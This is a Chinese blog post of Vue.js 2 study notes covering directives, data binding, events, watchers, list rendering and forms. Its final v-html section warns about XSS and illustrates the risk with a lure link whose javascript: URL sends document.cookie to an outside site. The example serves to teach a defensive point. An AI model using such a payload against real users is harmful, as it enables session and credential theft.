---
title: vue.js的学习笔记
hide: false
date: 2022-05-27 21:17:15
tags:
  - vue框架
categories:
  - 技术笔记
image:  https://kaguranotamashii-1308648145.cos.ap-beijing.myqcloud.com/20220727213122.png
slug: 42133
---

# vue.js开发环境

## 关于作者

*尤雨溪*是Vue.js框架的作者，他是我最佩服的华人程序员之一，他的编码经历深深的激励着我。

> 程序员最讲究的就是作品，光说没用，代码要拿出来溜溜！所以现在程序员都得有自己的GitHub。
>
> [Vue作者尤雨溪：以匠人的态度不断打磨完善Vue（图灵访谈） - 百度文库 (baidu.com)](https://wenku.baidu.com/view/3ce25fa901d276a20029bd64783e0912a2167ca8.html)

![](https://kaguranotamashii-1308648145.cos.ap-beijing.myqcloud.com/20220727212525.png)



他还是位老二次元哈哈哈，不同版本都用经典动漫和小说作为版本名称

| 版本 |    发布日期    |                           版本名称                           |
| :--: | :------------: | :----------------------------------------------------------: |
| 3.2  |  2021年8月5日  | [Quintessential Quintuplets](https://zh.m.wikipedia.org/wiki/五等分的新娘)[[12\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-12) |
| 3.1  |  2021年6月7日  | [Pluto](https://zh.m.wikipedia.org/wiki/PLUTO_～冥王～)[[13\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-13) |
| 3.0  | 2020年9月18日  | [One Piece](https://zh.m.wikipedia.org/wiki/One_Piece)[[14\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-14) |
| 2.6  |  2019年2月4日  | [Macross](https://zh.m.wikipedia.org/wiki/Macross)[[15\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-15) |
| 2.5  | 2017年10月13日 | [Level E](https://zh.m.wikipedia.org/wiki/靈異E接觸)[[16\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-16) |
| 2.4  | 2017年7月13日  | [Kill la Kill](https://zh.m.wikipedia.org/wiki/KILL_la_KILL)[[17\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-17) |
| 2.3  | 2017年4月27日  | [JoJo's Bizarre Adventure](https://zh.m.wikipedia.org/wiki/JoJo's_Bizarre_Adventure)[[18\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-18) |
| 2.2  | 2017年2月26日  | [Initial D](https://zh.m.wikipedia.org/wiki/頭文字D)[[19\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-19) |
| 2.1  | 2016年11月22日 | [Hunter X Hunter](https://zh.m.wikipedia.org/wiki/HUNTER×HUNTER)[[20\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-20) |
| 2.0  | 2016年9月30日  | [Ghost in the Shell](https://zh.m.wikipedia.org/wiki/攻殼機動隊)[[21\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-21) |
| 1.0  | 2015年10月27日 | [Evangelion](https://zh.m.wikipedia.org/wiki/Evangelion)[[22\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-22) |
| 0.12 | 2015年6月12日  | [Dragon Ball](https://zh.m.wikipedia.org/wiki/七龙珠)[[23\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-23) |
| 0.11 | 2014年11月7日  | [Cowboy Bebop](https://zh.m.wikipedia.org/wiki/Cowboy_Bebop)[[24\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-24) |
| 0.10 | 2014年3月23日  | [Blade Runner](https://zh.m.wikipedia.org/wiki/Blade_Runner)[[25\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-25) |
| 0.9  | 2014年2月25日  | [Animatrix](https://zh.m.wikipedia.org/wiki/黑客帝国动画版)[[26\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-26) |
| 0.8  | 2014年1月27日  | 不适用 [[27\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-27) |
| 0.7  | 2013年12月24日 | 不适用 [[28\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-28) |
| 0.6  | 2013年12月8日  | VueJS [[29\]](https://zh.m.wikipedia.org/zh-hans/Vue.js#cite_note-29) |

## 关于vscode

```
Vue 3 Snippets:快速生成Vue3代码的插件
Vetur 的特性: 语法高亮, 代码片段 (emmet 给我的感觉是一个写好了的 snippet), 质量提示 & 错误、格式化 / 风格、智能提示等。
<script src="https://cdn.staticfile.org/vue/2.7.0/vue.min.js">
```

```javascript
 Vue.config.productionTip = false//设置为 false 以阻止 vue 在启动时生成生产提示。
```



# 认识vue

```javascript
   <div id="root">
        <h1>Hello,宋宇然</h1>
        <h1>我的年龄为：{{name}}</h1>
    </div>
    <script>
        //const x = 
        new Vue({
            el: '#root',//element
            data: {
                name: 'a'
            }
        }
        )
    </script>
```

想让vue工作要先**创建vue实例**，root容器代码依然符合html规范只不过里面引入了特殊的vue语法而已，root里面的代码称之为**vue模板**

  

插值语法

**v-on**

绑定事件

```html
    <div id="root">

        <img v-bind:src="url" alt="">
        <button v-on:click="sayHi"> d点我</button>
        <button @click="sayHi"> d点我</button>

    </div>
    <script>
        new Vue({
            el: "#root",
            data: {
                url: "../"
            },
            methods: {
                sayHi() {
                    alert("hello")
                }
            },
        })
    </script>
```

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../vue.js"></script>
</head>

<body>
    <div id="root">

        <img v-bind:src="url" alt="">
        <button v-on:click="sayHi"> d点我</button>
        <button @click="changImg"> d点我</button>

    </div>
    <script>
        new Vue({
            el: "#root",
            data: {
                url: "1.png"
            },
            methods: {
                sayHi() {
                    alert("hello")
                },
                changImg() {
                    this.url = "2.png"
                }
            },
        })
    </script>
</body>

</html>
```

v-on绑定方法

v-bind 绑定属性

绑定文本



```
npm install -g cnpm --registry=https://registry.npm.taobao.org


```

## 脚手架

```
npm install -g @vue/cli
使用vue项目 vue create hello
启动服务器 npm run serve
```

**创建**vue项目

创建项目

执行:vue create xxxx xxxx是项目名,不要大写和特殊符号





## 数据双向绑定

```html

<body>
    <div id="app">
        <input v-model="message">
        <input v-model="formData.username"><br>
        <input v-model="formData.password">
        <button v-on:click="subit">提交</button>
        <p>{{ message }}</p>
    </div>
    <script>
        new Vue({
            el: "#app",
            data: {
                number: 0,
                message: "hello",
                formData: {
                    username: '',
                    password: '',
                }
            },
            methods: {
                subit() {
                    console.log(this.formData)
                }
            },

        })
    </script>
</body>
```

## 条件和循环

控制切换一个元素是否显示也相当简单：

```
<div id="app-3">
  <p v-if="seen">现在你看到我了</p>
</div>
var app3 = new Vue({
  el: '#app-3',
  data: {
    seen: true
  }
})
```

现在你看到我了

继续在控制台输入 `app3.seen = false`，你会发现之前显示的消息消失了。

```

```

外，Vue 也提供一个强大的过渡效果系统，可以在 Vue 插入/更新/移除元素时自动应用[过渡效果](https://cn.vuejs.org/v2/guide/transitions.html)。

还有其它很多指令，每个都有特殊的功能。例如，`v-for` 指令可以绑定数组的数据来渲染一个项目列表：

```
<div id="app-4">
  <ol>
    <li v-for="todo in todos">
      {{ todo.text }}
    </li>
  </ol>
</div>
var app4 = new Vue({
  el: '#app-4',
  data: {
    todos: [
      { text: '学习 JavaScript' },
      { text: '学习 Vue' },
      { text: '整个牛项目' }
    ]
  }
})
```

1. 学习 JavaScript
2. 学习 Vue
3. 整个牛项目

在控制台里，输入 `app4.todos.push({ text: '新项目' })`，你会发现列表最后添加了一个新项目。





Vue 还提供了 `v-model` 指令，它能轻松实现表单输入和应用状态之间的双向绑定。

```html
<div id="app-6">
  <p>{{ message }}</p>
  <input v-model="message">
</div>
var app6 = new Vue({
  el: '#app-6',
  data: {
    message: 'Hello Vue!'
  }
})
```



## 事件修饰符

- prevent 阻止默认事件
- stop 阻止事件冒泡
- once 事只能触发一次

  

## 键盘事件

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../vue.js"></script>
</head>

<body>
    <div id="app">
        <h2>欢迎来学习</h2>
        <input type="text" placeholder="回车后提示输入 " @keyup.enter="a">
    </div>
    <script>
        new Vue({
            el: '#app',
            methods: {
                a(e) {

                    console.log(e.target.value)
                }
            },
        })
    </script>
</body>

</html>
```

![](https://kaguranotamashii-1308648145.cos.ap-beijing.myqcloud.com/20220801132147.png)

## 计算属性computed

```javascript
conputed{
fullname:{
get(){
//get 当读取fullname时get就会被调用作为返回值
}
}
}
```

## 监视

```javascript
           watch: {
                isHot: {
                    handler() {
                        console.log("修改了")
                    }
                }
            }
```

```
vm.$watch{

}
```

## 条件渲染

v-show

```html
    <div id="app">
        <h2 v-show="false">aaaaa</h2>
    </div>
    <script>
        new Vue({
            el: '#app'
        })
    </script>
```

```html
v-if
    <div id="app">
        <h2 v-if="11==1">aaaaa</h2>
    </div>
```

## 列表渲染

```html
<body>
    <div id="root">
        <ui>
            <li v-for="person in persons" :key="person.id">{{person.name}}-{{person.age}}</li>


        </ui>
    </div>
    <script>
        new Vue({
            el: '#root',
            data: {
                persons: [
                    { id: '01', name: '宋宇然', age: 17 },
                    { id: '02', name: '市政厅', age: 19 },
                    { id: '03', name: '虞美人', age: 15 },

                ]
            }
        })
    </script>
    <!-- key要写-->
```

![](https://kaguranotamashii-1308648145.cos.ap-beijing.myqcloud.com/20220802140109.png)

**关于key为什么要写**

如果是在这种情况下li里面夹着input，add一个新的列表，会改变input的值，无法同步，这时候key就又存在的必要性了

[(99条消息) Vue中key的作用及原理_纸照片的博客-CSDN博客_vue中的key](https://blog.csdn.net/cun_king/article/details/120714227)

```html

<body>
    <div id="root">
        <h2>人员列表</h2>
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <ul>
            <li v-for="(p,index) of filPerons" :key="index">
                {{p.name}}-{{p.age}}-{{p.sex}}
            </li>
        </ul>
    </div>
    <script src="https://cdn.bootcdn.net/ajax/libs/vue/2.6.13/vue.js"></script>
    <script>
        new Vue({
            el: '#root',
            data: {
                keyWord: '',
                persons: [
                    { id: '001', name: '马冬梅', age: 19, sex: '女' },
                    { id: '002', name: '周冬雨', age: 20, sex: '女' },
                    { id: '003', name: '周杰伦', age: 21, sex: '男' },
                    { id: '004', name: '温兆伦', age: 22, sex: '男' }
                ],
                filPerons: []
            },
            watch: {
                keyWord: {
                    immediate: true,
                    handler(val) {
                        this.filPerons = this.persons.filter((p) => {
                            return p.name.indexOf(val) !== -1
                        })
                    }
                }
            }
        })
    </script>
</body>
```

### vue更新的问题

```javascript
				updateMei() {
					// this.persons[0].name = '马老师' //奏效
					// this.persons[0].age = 50 //奏效
					// this.persons[0].sex = '男' //奏效
					// this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
					this.persons.splice(0, 1, { id: '001', name: '马老师', age: 50, sex: '男' })
				}
```

```javascript
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				}
```

​    <!--

​      Vue监视数据的原理：

​        \1. vue会监视data中所有层次的数据。



​        \2. 如何监测对象中的数据？

​                通过setter实现监视，且要在new Vue时就传入要监测的数据。

​                  (1).对象中后追加的属性，Vue默认不做响应式处理

​                  (2).如需给后添加的属性做响应式，请使用如下API：

​                          Vue.set(target，propertyName/index，value) 或 

​                          vm.$set(target，propertyName/index，value)



​        \3. 如何监测数组中的数据？

​                  通过包裹数组更新元素的方法实现，本质就是做了两件事：

​                    (1).调用原生对应的方法对数组进行更新。

​                    (2).重新解析模板，进而更新页面。



​        4.在Vue修改数组中的某个元素一定要用如下方法：

​              1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()

​              2.Vue.set() 或 vm.$set()

​        

​        特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！

​    -->





```html
<!-- 		
			收集表单数据：
					若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
					若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
					若：<input type="checkbox"/>
							1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
							2.配置input的value属性:
									(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
									(2)v-model的初始值是数组，那么收集的的就是value组成的数组
					备注：v-model的三个修饰符：
									lazy：失去焦点再收集数据
									number：输入字符串转为有效的数字
									trim：输入首尾空格过滤
		-->
		
				<div id="root">
			<form @submit.prevent="demo">
				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
				性别：
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
				爱好：
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
				所属校区
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
				<button>提交</button>
			</form>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18,
					sex:'female',
					hobby:[],
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))
				}
			}
		})
	</script>
</html>
```

## v-text

```html
<body>
		<!-- 
				我们学过的指令：
						v-bind	: 单向绑定解析表达式, 可简写为 :xxx
						v-model	: 双向数据绑定
						v-for  	: 遍历数组/对象/字符串
						v-on   	: 绑定事件监听, 可简写为@
						v-if 	 	: 条件渲染（动态控制节点是否存存在）
						v-else 	: 条件渲染（动态控制节点是否存存在）
						v-show 	: 条件渲染 (动态控制节点是否展示)
				v-text指令：
						1.作用：向其所在的节点中渲染文本内容。
						2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-text="name"></div>
			<div v-text="str"></div>
		</div>
	</body>

```

## v-html

```html
	<body>
		<!-- 
				v-html指令：
						1.作用：向指定节点中渲染包含html结构的内容。
						2.与插值语法的区别：
									(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
									(2).v-html可以识别html结构。
						3.严重注意：v-html有安全性问题！！！！
									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
									(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
```

